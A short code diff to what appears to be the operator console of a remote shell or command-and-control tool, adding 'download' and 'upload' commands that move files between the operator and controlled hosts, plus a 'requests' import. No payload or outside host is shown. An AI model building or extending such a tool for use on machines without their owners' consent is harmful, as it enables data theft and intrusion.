@@ -3,6 +3,7 @@ import time
 import os
 from rich.console import Console
 from rich.table import Table
+import requests
 
 HELP = """Commands:
     shell [id] - Sets the current shell
@@ -93,6 +94,10 @@ class Shell:
             self.send_command({"event": "cd", "path": cli_spl[1]})
         elif cli_spl[0] == "install_dir":
             self.send_command({"event": "install_dir"})
+        elif cli_spl[0] == "download":
+            self.send_command({"event": "download", "file": os.path.basename(cli_spl[1]), "path": cli_spl[2]})
+        elif cli_spl[0] == "upload":
+            self.send_command({"event": "upload", "file": cli_spl[1]})
         elif cli_spl[0] == "clear":
             self.console.clear()
         elif cli_spl[0] == "exit":
